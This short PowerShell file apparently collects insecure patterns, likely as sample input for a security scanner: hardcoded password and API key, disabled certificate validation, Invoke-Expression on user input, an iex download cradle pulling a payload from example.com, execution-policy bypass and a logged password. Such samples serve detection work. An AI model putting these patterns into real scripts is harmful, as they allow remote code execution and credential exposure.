$Password = "MyS3cr3tPass!"
$ApiKey = "sk-proj-abc123xyz789"

[Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

Invoke-Expression $UserInput

iex (New-Object Net.WebClient).DownloadString('http://example.com/payload')

Set-ExecutionPolicy Bypass -Scope Process -Force

Write-Verbose "Connecting with password: $Password"

function FetchUserData {
    param($Server, $Username)
    Write-Host "Fetching from $Server"
}

Invoke-RestMethod -Uri "http://api.example.com/deploy" -Method Post
